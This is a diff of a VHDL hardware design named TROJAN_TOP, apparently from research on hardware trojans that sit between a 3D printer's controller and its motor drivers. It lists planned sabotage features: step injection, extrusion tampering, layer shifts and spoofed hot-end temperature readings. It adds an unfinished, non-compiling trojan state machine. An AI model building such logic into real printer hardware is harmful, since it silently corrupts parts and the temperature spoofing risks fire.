@@ -10,41 +10,35 @@ entity TROJAN_TOP is
         i_E0_DIR    : in std_logic;
         i_E0_EN     : in std_logic;
         i_E0_STEP   : in std_logic;
-        
-        i_X_DIR     : in std_logic;  -- X Direction input
-        i_X_EN      : in std_logic;  -- X Enable input
-        i_X_MIN     : in std_logic;  -- X Min input
-        i_X_STEP    : in std_logic;  -- X Step input  
-        
-        i_Y_DIR     : in std_logic;  -- Y Direction input
-        i_Y_EN      : in std_logic;  -- Y Enable input
-        i_Y_MIN     : in std_logic;  -- Y Min input
-        i_Y_STEP    : in std_logic;  -- Y Step input
-        
-        i_Z_DIR     : in std_logic;  -- Z Direction input
-        i_Z_EN      : in std_logic;  -- Z Enable input
-        i_Z_MIN     : in std_logic;  -- Z Min input
-        i_Z_STEP    : in std_logic;  -- Z Step input
+        i_X_DIR     : in std_logic; 
+        i_X_EN      : in std_logic; 
+        i_X_MIN     : in std_logic; 
+        i_X_STEP    : in std_logic;   
+        i_Y_DIR     : in std_logic; 
+        i_Y_EN      : in std_logic; 
+        i_Y_MIN     : in std_logic; 
+        i_Y_STEP    : in std_logic; 
+        i_Z_DIR     : in std_logic; 
+        i_Z_EN      : in std_logic; 
+        i_Z_MIN     : in std_logic; 
+        i_Z_STEP    : in std_logic; 
 
         -- Data Signals Out
         o_E0_DIR    : out std_logic;
         o_E0_EN     : out std_logic;
         o_E0_STEP   : out std_logic;
-        
-        o_X_DIR     : out std_logic; --X_DIR  output
-        o_X_EN      : out std_logic; --X_EN   output
-        o_X_MIN     : out std_logic; --X_MIN  output
-        o_X_STEP    : out std_logic; --X_STEP output
-        
-        o_Y_DIR     : out std_logic; --Y_DIR  output
-        o_Y_EN      : out std_logic; --Y_EN   output
-        o_Y_MIN     : out std_logic; --Y_MIN  output
-        o_Y_STEP    : out std_logic; --Y_STEP output
-        
-        o_Z_DIR     : out std_logic; --Z_DIR  output
-        o_Z_EN      : out std_logic; --Z_EN   output
-        o_Z_MIN     : out std_logic; --Z_MIN  output
-        o_Z_STEP    : out std_logic  --Z_STEP output
+        o_X_DIR     : out std_logic; 
+        o_X_EN      : out std_logic; 
+        o_X_MIN     : out std_logic; 
+        o_X_STEP    : out std_logic; 
+        o_Y_DIR     : out std_logic; 
+        o_Y_EN      : out std_logic; 
+        o_Y_MIN     : out std_logic; 
+        o_Y_STEP    : out std_logic; 
+        o_Z_DIR     : out std_logic; 
+        o_Z_EN      : out std_logic; 
+        o_Z_MIN     : out std_logic; 
+        o_Z_STEP    : out std_logic  
     );
 end TROJAN_TOP;
 
@@ -69,32 +63,34 @@ architecture Behavioral of Trojan_TOP is
 	END COMPONENT;
 	   
     -- Edge Detected signals
-    signal s_edge_x_step : std_logic := '0';
-    signal s_edge_y_step : std_logic := '0';
-    signal s_edge_z_step : std_logic := '0';
-    signal s_edge_e_step : std_logic := '0';
+    signal X_STEP_EDGE : std_logic := '0';
+    signal Y_STEP_EDGE : std_logic := '0';
+    signal Z_STEP_EDGE : std_logic := '0';
+    signal E_STEP_EDGE : std_logic := '0';
 
     -- Pulse Related Signals per Axis
     constant PULSES_PER_STEP : std_logic_vector(5 downto 0) := "10000";  -- 16 pulses per step --> 1.8 degrees (?)
     
+    -- Modified Output Signals 
     signal X_STEP_MOD : std_logic := '0';
     signal Y_STEP_MOD : std_logic := '0';
     signal Z_STEP_MOD : std_logic := '0';
     signal E_STEP_MOD : std_logic := '0';
 
+    -- Enable Signals for Axis Pulse gen 
     signal X_PULSE_EN : std_logic := '0';
     signal Y_PULSE_EN : std_logic := '0';
     signal Z_PULSE_EN : std_logic := '0';
     signal E_PULSE_EN : std_logic := '0';
 
+    -- Required steps are sent
     signal X_STEP_COMPLETE : std_logic := '0';
     signal Y_STEP_COMPLETE : std_logic := '0';
     signal Z_STEP_COMPLETE : std_logic := '0';
     signal E_STEP_COMPLETE : std_logic := '0';
 
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
-    signal TROJ_T1_ENABLE : std_logic := '0'; -- Randomly adds or removes steps from X or Y axis
-        
+    signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds or removes steps from X or Y axis during move
     signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
     signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
     signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
@@ -102,15 +98,29 @@ architecture Behavioral of Trojan_TOP is
     signal TROJ_T6_ENABLE : std_logic := '0'; -- Spoofing of measured hot-end thermocouple temperatures via ADC
     signal TROJ_T7_ENABLE : std_logic := '0'; -- 
     signal TROJ_T8_ENABLE : std_logic := '0'; -- 
+
+    type State_Type is (IDLE, STATE_1, STATE_2, STATE_3, STATE_4, STATE_5, DISABLE);
+
+    -- Trojan 1 Related Signals 
+    signal T1_STATE, T1_NEXT_STATE: State_Type;
+    signal TROJ_T1_COUNT_EN : std_logic := '0';
+    signal TROJ_T1_COUNTER : std_logic_vector (15 downto 0) := (others=>'0');
+
+    -- Trojan 2 Related Signals 
+    -- Trojan 3 Related Signals 
+    -- Trojan 4 Related Signals 
+    -- Trojan 5 Related Signals 
+    -- Trojan 6 Related Signals 
+    -- Trojan 7 Related Signals    
     
 begin
 
     ------- Components--------- 
     -- Edge Detectors 
-    X_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_X_STEP, output => s_edge_x_step);
-    Y_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Y_STEP, output => s_edge_y_step);
-    Z_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Z_STEP, output => s_edge_z_step);
-    E_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_E0_STEP, output => s_edge_e_step);
+    X_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_X_STEP,  output => X_STEP_EDGE);
+    Y_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Y_STEP,  output => Y_STEP_EDGE);
+    Z_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_Z_STEP,  output => Z_STEP_EDGE);
+    E_STEP_EDGE : RISING_EDGE_DETECTOR PORT MAP(i_CLK => i_CLK, input => i_E0_STEP, output => E_STEP_EDGE);
     
     -- Pulse Generators
     X_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => X_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => X_STEP_MOD, o_COMPLETE => X_STEP_COMPLETE);
@@ -118,8 +128,6 @@ begin
     Z_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => Z_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => Z_STEP_MOD, o_COMPLETE => Z_STEP_COMPLETE);
     E_PULSE_GEN : PULSE_GEN PORT MAP (i_CLK => i_CLK, i_PULSE_EN => E_PULSE_EN, i_PULSES_TO_SEND => PULSES_PER_STEP, o_PULSE_SIG => E_STEP_MOD, o_COMPLETE => E_STEP_COMPLETE);
     
-
-
     --------------------------- Pulse Gen Test Start ---------------------------
     -- For testing the output of the pulse gen in trojan mode
     -- This part of the code should countinously move the X axis when bypass mode is turned off 
@@ -137,19 +145,130 @@ begin
     end process;
     --------------------------- Pulse Gen Test End ---------------------------
  
+    --------------------------- Trojan 1 Logic Start ---------------------------
+    -- This trojan adds or removes steps from the X and Y Axis 
+    
+    trojan_t1_proc : process (i_CLK)
+    begin
+        if rising_edge(i_CLK) then
+            T1_STATE <= T1_NEXT_STATE;
+            case T1_STATE is
+                when IDLE =>
+                    if TROJ_T1_ENABLE = '1' then
+
+                        T1_NEXT_STATE <= STATE_1;
+                    else
+                        T1_NEXT_STATE <= DISABLE;
+                    end if;
+
+                when STATE_1 =>
+
+
+                when DISABLE =>
+                    -- Turn off signals here
+
+                    T1_NEXT_STATE <= IDLE;
+            end case;
+        end if;
+    end process;
+    --------------------------- Trojan 1 Logic End ---------------------------
 
     --------------------------- Trojan 1 Logic Start ---------------------------
-    -- This trojan adds or removes steps form the X and Y 
+    -- This trojan adds or removes steps from the X and Y Axis 
+    
     trojan_t1_proc : process (i_CLK)
     begin
         if rising_edge(i_CLK) then
             if (TROJ_T1_ENABLE = '1') then
-            
+                if(X_STEP_COMPLETE = '1') then
+                    -- Turn off X_PULSE_EN
+                    -- Turn off Y_PULSE_EN
+                elsif (TROJ_T1_COUNT_EN = '0') then 
+                    TROJ_T1_COUNT_EN
+                elsif (TROJ_T1_COUNTER = T1_TRIG_VAL1) then 
+                    DIR = '0';
+                    X_PULSE_EN = '1';
+                    Y_PULSE_EN = '1';
+                elsif (TROJ_T1_COUNTER = T1_TRIG_VAL2) then 
+                    DIR = '1';
+                    X_PULSE_EN = '1';
+                    Y_PULSE_EN = '1';
+                else    
+                    TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
+                end if;
+            else
+                X_PULSE_EN <= '0';
+                Y_PULSE_EN <= '0';
             end if;
         end if;
     end process;
     --------------------------- Trojan 1 Logic End ---------------------------
 
+
+    -- process(i_CLK)
+    -- begin
+    --     if rising_edge(i_CLK) then
+    --         CurrentState <= NextState;
+    --         case CurrentState is
+    --             when Idle =>
+    --                 if TROJ_T1_ENABLE = '1' then
+    --                     if X_STEP_COMPLETE = '1' then
+    --                         NextState <= DisablePulse;
+    --                     elsif TROJ_T1_COUNT_EN = '0' then
+    --                         NextState <= CountEnable;
+    --                     end if;
+    --                 else
+    --                     NextState <= DisableOutput;
+    --                 end if;
+
+    --             when DisablePulse =>
+    --                 X_PULSE_EN <= '0';
+    --                 Y_PULSE_EN <= '0';
+    --                 NextState <= Idle;
+
+    --             when CountEnable =>
+    --                 if TROJ_T1_COUNTER = T1_TRIG_VAL1 then
+    --                     NextState <= Direction0;
+    --                 elsif TROJ_T1_COUNTER = T1_TRIG_VAL2 then
+    --                     NextState <= Direction1;
+    --                 end if;
+
+    --             when Direction0 =>
+    --                 DIR <= '0';
+    --                 X_PULSE_EN <= '1';
+    --                 Y_PULSE_EN <= '1';
+    --                 NextState <= IncrementCounter;
+
+    --             when Direction1 =>
+    --                 DIR <= '1';
+    --                 X_PULSE_EN <= '1';
+    --                 Y_PULSE_EN <= '1';
+    --                 NextState <= IncrementCounter;
+
+    --             when IncrementCounter =>
+    --                 TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
+    --                 NextState <= Idle;
+
+    --             when DisableOutput =>
+    --                 X_PULSE_EN <= '0';
+    --                 Y_PULSE_EN <= '0';
+    --                 NextState <= Idle;
+    --         end case;
+    --     end if;
+    -- end process;
+
+
+    --------------------------- Trojan 2 Logic Start ---------------------------
+    -- This trojan adds or removes steps from the X and Y Axis 
+    trojan_t2_proc : process (i_CLK)
+    begin
+        if rising_edge(i_CLK) then
+            if (TROJ_T2_ENABLE = '1') then
+            
+            end if;
+        end if;
+    end process;
+    --------------------------- Trojan 2 Logic End ---------------------------
 
 
 end Behavioral;
